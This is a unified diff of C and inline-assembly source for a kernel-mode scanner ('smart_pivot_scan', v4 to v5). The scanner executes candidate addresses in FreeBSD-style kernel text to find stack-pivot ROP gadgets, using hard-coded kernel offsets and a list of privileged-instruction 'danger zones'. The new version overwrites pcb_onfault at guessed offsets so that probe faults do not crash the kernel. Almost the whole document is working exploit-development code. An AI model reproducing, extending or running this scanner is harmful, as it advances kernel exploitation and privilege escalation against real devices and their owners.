@@ -1,50 +1,30 @@
 #include <stdint.h>
 
 /*
- * smart_pivot_scan v4 — Safe ktext pivot gadget scanner
+ * smart_pivot_scan v5 — Safe ktext pivot gadget scanner with fault recovery
  *
- * CRITICAL FIX: Use the real kernel stack for probes.
+ * KEY INNOVATION: Uses FreeBSD pcb_onfault to CATCH probe faults.
  *
- * Previous versions used a 256-byte entry_stk in .bss as RSP during probes.
- * When ANY probe faulted, the CPU pushed a trap frame (~200 bytes) onto this
- * tiny stack, which overflowed into .rodata/.text → double fault → instant
- * kernel panic. This happened even with "safe" epilogue probes because
- * alignment padding/mid-instruction bytes can still decode to faulting ops.
+ * When a kernel thread faults without pcb_onfault set, FreeBSD calls
+ * trap_fatal() → panic(). By setting pcb_onfault to our recovery label,
+ * faults during probes jump to recovery instead of panicking. This is
+ * the same mechanism copyin/copyout use.
  *
- * Fix: push resume addresses + candidate onto the REAL kernel thread stack
- * (16KB). If a probe faults, the CPU has a valid, large stack for the trap
- * handler. The thread may still die (kernel threads panic on unhandled
- * faults), but at least it won't double-fault.
+ * FreeBSD amd64 accesses the current PCB via %gs:PC_CURPCB.
+ * pcb_onfault is at offset PCB_ONFAULT within struct pcb.
+ * We try common FreeBSD 13 offsets and validate before using.
  *
  * Memory layout:
- *   exec_code page (4096): code + rodata + .bss (func_list, pivot_chain, vars)
+ *   exec_code page (4096): code + rodata + .bss
  *   kthread_args (4096):   output[0..2303] + safe_region[2304..4095]
  *   kernel stack (16KB):   probe frames pushed here
  *
- * Probing strategy: EPILOGUE — probe backwards from function boundaries.
- *   Function epilogues (pop/ret) are much safer than prologues/bodies.
- *   Pivot gadgets (48 94 C3, 50 5C C3) end with C3 (ret) = function end.
+ * Probing: EPILOGUE — backwards from function boundaries (safe pop/ret).
  *
  * Configure via -D flags:
- *   SCAN_BATCH:    which batch of the sorted pointer list to scan (0-based)
- *   BATCH_SIZE:    how many function boundaries per batch (default 8)
- *   PROBE_DEPTH:   bytes before each boundary to probe (default 16)
- *
- * Output layout (uint64_t indices):
- *   [0]  magic "SPVT" (0x53505654) | status(32)
- *   [1]  kdata_base
- *   [2]  ktext_base
- *   [3]  batch_id | (batch_size << 16) | (probe_depth << 32)
- *   [4]  total_probed
- *   [5]  total_survived
- *   [6]  total_skipped (danger zone hits)
- *   [7]  found_addr (pivot gadget address, or 0)
- *   [8]  found_ktext_offset (ktext-relative, or 0)
- *   [9]  n_funcs (total function entry points found)
- *   Per boundary probed (starting at index 10, 3 uint64_t each):
- *     [10+i*3+0]  boundary address (next_func)
- *     [10+i*3+1]  probed_count | (survived_count << 16) | (skipped_count << 32)
- *     [10+i*3+2]  last_probed_offset | (status << 32)
+ *   SCAN_BATCH:  batch index (0-based)
+ *   BATCH_SIZE:  function boundaries per batch (default 8)
+ *   PROBE_DEPTH: bytes before each boundary (default 16)
  */
 
 #ifndef SCAN_BATCH
@@ -61,30 +41,33 @@
 #define KTEXT_SIZE     0xC00000
 #define HEADER_SLOTS   10
 
-/* Danger zones: ktext regions with privileged instructions */
+/* Common FreeBSD 13 amd64 offsets for pcb_onfault access.
+ * PC_CURPCB: offset of pc_curpcb in struct pcpu (accessed via %gs:)
+ * PCB_ONFAULT: offset of pcb_onfault in struct pcb
+ *
+ * We try multiple candidates and validate by checking the current
+ * value is 0 (NULL = no fault handler active, expected for fresh thread).
+ */
+#define PC_CURPCB_CANDIDATES  3
+static const int pc_curpcb_offsets[] = { 0x10, 0x18, 0x20 };
+#define PCB_ONFAULT_CANDIDATES 4
+static const int pcb_onfault_offsets[] = { 0xb0, 0xb8, 0xc0, 0xc8 };
+
 typedef struct {
     int64_t  kdata_offset;
     int32_t  radius;
 } danger_zone_t;
 
 static const danger_zone_t danger_zones[] = {
-    { -0x9d20cc, 16 },    /* wrmsr; ret */
-    { -0x9d0cfa, 64 },    /* rdmsr sequence */
-    { -0x396f9e, 16 },    /* mov cr3, rax */
-    { -0x39700e, 16 },    /* mov rdi, cr3 */
-    { -0x9d6d93, 48 },    /* dr2gpr */
-    { -0x9d6c7a, 48 },    /* gpr2dr_1 */
-    { -0x9d6b87, 48 },    /* gpr2dr_2 */
-    { -0x9d6f80, 192 },   /* cpu_switch */
-    { -0x9cf84c, 32 },    /* doreti_iret */
-    { -0x9cf84c + 10, 32 }, /* swapgs_add_rsp_iret */
-    { -0x9cf8ab, 64 },    /* pop_all_iret */
-    { -0x96be70, 64 },    /* push_pop_all_iret */
-    { -0x70b963, 32 },    /* kmem_alloc_rwx_fix */
-    { 0, 0 }
+    { -0x9d20cc, 16 },    { -0x9d0cfa, 64 },
+    { -0x396f9e, 16 },    { -0x39700e, 16 },
+    { -0x9d6d93, 48 },    { -0x9d6c7a, 48 },
+    { -0x9d6b87, 48 },    { -0x9d6f80, 192 },
+    { -0x9cf84c, 32 },    { -0x9cf84c + 10, 32 },
+    { -0x9cf8ab, 64 },    { -0x96be70, 64 },
+    { -0x70b963, 32 },    { 0, 0 }
 };
 
-/* Known ktext function entry points (kdata-relative negative offsets) */
 static const int64_t known_ktext_funcs[] = {
     -0x99002a, -0x9908e0, -0x990990, -0x6824c0, -0x8a5c40,
     -0x631ea9, -0x802311, -0xa9b00,  -0x8a54cd, -0x8a52c3,
@@ -108,15 +91,15 @@ static inline uint64_t rdmsr(uint32_t msr)
     return ((uint64_t)hi << 32) | lo;
 }
 
-/* ── .bss globals for asm (RIP-relative) ── */
+/* .bss globals for asm (RIP-relative) */
 static volatile uint64_t scan_saved_rsp;
 static volatile uint64_t scan_resume_pivot;
 static volatile int scan_got_pivot;
+static volatile int scan_got_fault;
 static volatile uint64_t scan_candidate;
 static volatile uint64_t safe_addr;
 static volatile uint64_t pivot_chain[8];
-/* NO entry_stk — probes use the real kernel stack */
-
+static volatile uint64_t pcb_onfault_ptr;  /* address of pcb->pcb_onfault */
 static uint64_t func_list[96];
 
 __attribute__((naked, used))
@@ -124,6 +107,18 @@ static void pivot_landing(void)
 {
     __asm__ volatile(
         "movq $1, scan_got_pivot(%%rip)\n\t"
+        "movq scan_saved_rsp(%%rip), %%rsp\n\t"
+        "jmpq *scan_resume_pivot(%%rip)\n\t"
+        ::: "memory"
+    );
+}
+
+/* Fault recovery: jumped to by trap() via pcb_onfault */
+__attribute__((naked, used))
+static void fault_recovery(void)
+{
+    __asm__ volatile(
+        "movq $1, scan_got_fault(%%rip)\n\t"
         "movq scan_saved_rsp(%%rip), %%rsp\n\t"
         "jmpq *scan_resume_pivot(%%rip)\n\t"
         ::: "memory"
@@ -155,6 +150,49 @@ static void sort_u64(uint64_t* arr, int n)
     }
 }
 
+/*
+ * Find pcb_onfault address by probing common FreeBSD 13 offsets.
+ * Returns the address of pcb->pcb_onfault, or 0 if not found.
+ *
+ * Approach:
+ *   1. Read %gs:candidate_offset to get pcb pointer
+ *   2. Validate: pcb should be a kernel address (0xffffff80...)
+ *   3. Read pcb+onfault_offset — should be 0 (no active fault handler)
+ *   4. If all checks pass, return &pcb->pcb_onfault
+ */
+static uint64_t find_pcb_onfault(void)
+{
+    for (int i = 0; i < PC_CURPCB_CANDIDATES; i++) {
+        uint64_t pcb;
+        int off = pc_curpcb_offsets[i];
+
+        /* Read %gs:off */
+        __asm__ volatile(
+            "movq %%gs:(%1), %0"
+            : "=r"(pcb)
+            : "r"((uint64_t)off)
+        );
+
+        /* Validate: pcb should look like a kernel address */
+        if ((pcb >> 40) != 0xffffff)
+            continue;
+        /* Check alignment */
+        if (pcb & 0x7)
+            continue;
+
+        /* Try each pcb_onfault offset */
+        for (int j = 0; j < PCB_ONFAULT_CANDIDATES; j++) {
+            int foff = pcb_onfault_offsets[j];
+            uint64_t val = *(volatile uint64_t*)(pcb + foff);
+
+            /* Should be NULL for a fresh kernel thread */
+            if (val == 0)
+                return pcb + foff;
+        }
+    }
+    return 0;
+}
+
 int module_start(kproc_args* args)
 {
     uint64_t kdata_base = args->kdata_base;
@@ -174,11 +212,15 @@ int module_start(kproc_args* args)
     out[3] = (uint64_t)SCAN_BATCH | ((uint64_t)BATCH_SIZE << 16) |
              ((uint64_t)PROBE_DEPTH << 32);
 
-    /* Safe region in kthread_args tail (bytes 2304..4095) */
+    /* Safe region in kthread_args tail */
     volatile uint64_t* safe_region = (volatile uint64_t*)((uint8_t*)args + 2304);
     for (int i = 0; i < (4096 - 2304) / 8; i++)
         safe_region[i] = nop_ret;
     safe_addr = (uint64_t)((uint8_t*)args + 2304 + 896);
+
+    /* Find pcb_onfault for fault recovery */
+    pcb_onfault_ptr = find_pcb_onfault();
+    out[9] = pcb_onfault_ptr;  /* report: 0 = not found */
 
     /* Build sorted function list */
     int n_funcs = 0;
@@ -216,7 +258,6 @@ int module_start(kproc_args* args)
     }
 
     sort_u64(func_list, n_funcs);
-    out[9] = n_funcs;
 
     int batch_start = SCAN_BATCH * BATCH_SIZE;
     int batch_end = batch_start + BATCH_SIZE;
@@ -239,6 +280,7 @@ int module_start(kproc_args* args)
 
     int total_probed = 0;
     int total_survived = 0;
+    int total_faulted = 0;
     int total_skipped = 0;
 
     for (int fi = batch_start; fi < batch_end; fi++) {
@@ -283,28 +325,25 @@ int module_start(kproc_args* args)
                 out[func_slot + 2] = (uint64_t)off | ((uint64_t)0xBBBB << 32);
 
             scan_got_pivot = 0;
+            scan_got_fault = 0;
             scan_candidate = candidate;
 
             /*
-             * PROBE using the REAL kernel stack.
-             *
-             * Push 8 resume addresses + candidate onto the real stack.
-             * This way RSP stays on the 16KB kernel stack during the probe.
-             * If the candidate faults, the CPU has a valid stack for the
-             * trap frame → no double fault.
-             *
-             * The 8 resume addresses handle candidates with up to 7
-             * pop instructions before ret (pop;pop;...;ret patterns).
+             * Set pcb_onfault to our fault recovery handler.
+             * If the probe faults, trap() will jump to fault_recovery
+             * instead of calling trap_fatal() → panic().
              */
+            if (pcb_onfault_ptr) {
+                *(volatile uint64_t*)pcb_onfault_ptr = (uint64_t)fault_recovery;
+            }
+
             __asm__ volatile(
-                /* Save RSP (on real kernel stack) */
                 "movq %%rsp, scan_saved_rsp(%%rip)\n\t"
 
-                /* Set pivot resume target */
                 "leaq 2f(%%rip), %%rcx\n\t"
                 "movq %%rcx, scan_resume_pivot(%%rip)\n\t"
 
-                /* Push 8 resume addresses onto real kernel stack */
+                /* Push 8 resume addresses + candidate onto real kernel stack */
                 "leaq 1f(%%rip), %%rcx\n\t"
                 "pushq %%rcx\n\t"
                 "pushq %%rcx\n\t"
@@ -315,11 +354,10 @@ int module_start(kproc_args* args)
                 "pushq %%rcx\n\t"
                 "pushq %%rcx\n\t"
 
-                /* Push candidate address */
                 "movq scan_candidate(%%rip), %%rcx\n\t"
                 "pushq %%rcx\n\t"
 
-                /* Set all registers (except RAX, RSP) to safe_addr */
+                /* Set all registers to safe_addr */
                 "movq safe_addr(%%rip), %%rdi\n\t"
                 "movq %%rdi, %%rsi\n\t"
                 "movq %%rdi, %%rdx\n\t"
@@ -337,18 +375,16 @@ int module_start(kproc_args* args)
 
                 "cld\n\t"
 
-                /* RAX = pivot_chain */
                 "leaq pivot_chain(%%rip), %%rax\n\t"
 
-                /* Go! RSP is on real kernel stack. retq pops candidate. */
                 "retq\n\t"
 
-                /* Normal resume: candidate returned */
+                /* Normal/fault resume */
                 "1:\n\t"
                 "movq scan_saved_rsp(%%rip), %%rsp\n\t"
                 "jmp 3f\n\t"
 
-                /* Pivot resume: candidate pivoted RSP */
+                /* Pivot resume */
                 "2:\n\t"
                 "movq scan_saved_rsp(%%rip), %%rsp\n\t"
 
@@ -358,12 +394,17 @@ int module_start(kproc_args* args)
                     "rbp", "memory", "cc"
             );
 
+            /* Clear pcb_onfault after probe */
+            if (pcb_onfault_ptr) {
+                *(volatile uint64_t*)pcb_onfault_ptr = 0;
+            }
+
             if (scan_got_pivot) {
                 out[7] = candidate;
                 out[8] = candidate - ktext_base;
                 out[0] = ((uint64_t)0x0002 << 32) | MAGIC_SPVT;
                 out[5] = total_survived;
-                out[6] = total_skipped;
+                out[6] = total_skipped | ((uint64_t)total_faulted << 32);
                 if (func_slot + 2 < 2304/8) {
                     out[func_slot + 1] = (uint64_t)func_probed |
                                          ((uint64_t)func_survived << 16) |
@@ -373,8 +414,16 @@ int module_start(kproc_args* args)
                 return 0;
             }
 
-            func_survived++;
-            total_survived++;
+            if (scan_got_fault) {
+                total_faulted++;
+                /* Write faulted count in real-time */
+                out[6] = total_skipped | ((uint64_t)total_faulted << 32);
+            } else {
+                func_survived++;
+                total_survived++;
+            }
+            /* Write survived count in real-time */
+            out[5] = total_survived;
         }
 
         if (func_slot + 2 < 2304/8) {
@@ -389,7 +438,7 @@ int module_start(kproc_args* args)
     out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
     out[4] = total_probed;
     out[5] = total_survived;
-    out[6] = total_skipped;
+    out[6] = total_skipped | ((uint64_t)total_faulted << 32);
 
     return 0;
 }
